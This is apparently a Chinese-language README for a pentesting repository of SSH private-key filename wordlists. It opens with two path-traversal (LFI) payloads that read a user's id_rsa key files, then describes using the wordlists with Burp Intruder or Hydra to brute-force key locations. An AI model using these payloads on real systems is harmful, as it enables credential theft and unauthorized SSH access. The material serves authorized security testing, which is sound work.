
## 横向运动的LFI ?获得SSH访问权限?

```
?file=../../../../../../../../home/user/.ssh/id_rsa
?file=../../../../../../../../home/user/.ssh/id_rsa-cert
```


# SSH私钥名称字典表 | SSH Private Key Looting Wordlists 🔒🗝️
SSH
此存储库包含一组单词列表，以帮助查找或暴力强制SSH私钥文件名。这些单词列表对于渗透测试人员、安全研究人员和任何对评估SSH配置的安全性感兴趣的人都很有用。

[![GitHub Release](https://img.shields.io/github/release/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists.svg?style=flat-square)](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists/releases)
[![GitHub License](https://img.shields.io/github/license/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists.svg?style=flat-square)](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists/blob/master/LICENSE)

## 单词列表文件 📝

- **ssh-priv-key-loot-common.txt**: SSH 私钥文件的默认和常见命名约定。
- **ssh-priv-key-loot-medium.txt**:没有备份文件扩展名的可能文件名。
- **ssh-priv-key-loot-extended.txt**: 带有备份文件扩展名的可能文件名。
- **ssh-priv-key-loot-\*_w_gui.txt**: 包含在具有 GUI 的服务器上模拟 Ctrl+C 和 Ctrl+V 的文件名。

## 用法 🚀

这些单词列表可以与 Burp Intruder、Hydra、自定义 python 脚本或任何其他支持自定义单词列表的暴力破解工具一起使用。当针对 SSH 私钥文件时，它们可以帮助扩大暴力破解或枚举工作的范围。

## 致谢 🙏

这个[词表库](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists)的灵感来自约翰·哈蒙德的视频博客 "[Don't Forget This One Hacking Trick.](https://www.youtube.com/watch?v=2rqb3YSa1SE)" 



## 免责声明 ⚠️

请负责任地使用这些词表，并且仅在您被授权测试的系统上使用。未经授权使用是非法的。
